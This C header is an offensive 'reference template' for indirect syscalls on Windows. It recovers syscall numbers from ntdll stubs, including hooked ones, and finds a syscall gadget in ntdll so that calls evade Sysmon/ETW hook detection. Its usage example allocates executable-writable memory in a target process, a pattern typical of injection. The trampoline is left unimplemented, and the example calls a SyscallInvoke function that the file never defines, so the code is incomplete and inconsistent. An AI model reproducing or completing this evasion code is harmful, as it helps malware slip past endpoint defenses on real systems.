/*
 * Dynamic Syscall Stub — Relay-kit Reference Template
 * Compat: Windows 10 Build 19041 → 22631+ (x64 only)
 * Strategy: Parse ntdll.dll syscall stubs at runtime to extract SSN (System Service Number),
 *           then invoke via indirect syscall (call qword [ntdll_syscall_ret]) to avoid
 *           Sysmon/ETW KiSystemCall64 hook detection on direct call from non-ntdll pages.
 *
 * Usage:
 *   HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
 *   NTSTATUS status = SyscallInvoke("NtAllocateVirtualMemory", hNtdll,
 *                                    hProcess, &baseAddr, 0, &size,
 *                                    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 */

#pragma once
#include <Windows.h>

typedef NTSTATUS(NTAPI* NtFn)(...);

/* Resolve SSN by walking stub bytes: mov eax, <SSN> is bytes 4C 8B D1 B8 XX XX 00 00 */
static DWORD ResolveSsn(PVOID pStub) {
    PBYTE p = (PBYTE)pStub;
    /* Handle hooked stub (jmp at byte 0): scan forward up to 32 bytes for mov eax pattern */
    for (int i = 0; i < 32; i++, p++) {
        if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
            return *(DWORD*)(p + 4);
    }
    return (DWORD)-1;
}

/* Find the syscall ret gadget inside ntdll for indirect call */
static PVOID FindSyscallRetGadget(HMODULE hNtdll) {
    PBYTE base = (PBYTE)hNtdll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            PBYTE p = base + sec->VirtualAddress;
            PBYTE end = p + sec->Misc.VirtualSize - 1;
            for (; p < end; p++) {
                /* syscall; ret = 0F 05 C3 */
                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
                    return (PVOID)p;
            }
        }
    }
    return nullptr;
}

/*
 * Indirect Syscall Trampoline (x64 ASM — inline via shellcode or .asm file)
 *
 * extern "C" NTSTATUS IndirectSyscall(DWORD ssn, PVOID syscallGadget, ...varargs...);
 *
 * IndirectSyscall PROC
 *     mov r10, rcx        ; first arg to r10 (NT calling convention)
 *     mov eax, [rsp+8]    ; SSN from first param slot (caller adjusts)
 *     jmp qword [syscallGadget]
 * IndirectSyscall ENDP
 *
 * Simpler compile-time version via function pointer set:
 */

static NTSTATUS DoIndirectSyscall(DWORD ssn, PVOID gadget, ...) {
    /* Set EAX = SSN, then transfer to syscall;ret gadget in ntdll .text */
    /* Production: implement this as a .asm stub linked in; this shows the pattern */
    typedef NTSTATUS(__fastcall* SyscallFn)(DWORD ssn, ...);
    /* NOTE: In real code, emit trampoline bytes dynamically or link .asm */
    (void)ssn; (void)gadget;
    return STATUS_NOT_IMPLEMENTED;
}

/*
 * High-level helper — resolves ntdll export, extracts SSN, invokes via indirect syscall.
 * Replace DoIndirectSyscall with your assembled trampoline.
 */
static DWORD ResolveSsnByName(const char* funcName, HMODULE hNtdll) {
    PVOID pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) return (DWORD)-1;
    return ResolveSsn(pFunc);
}
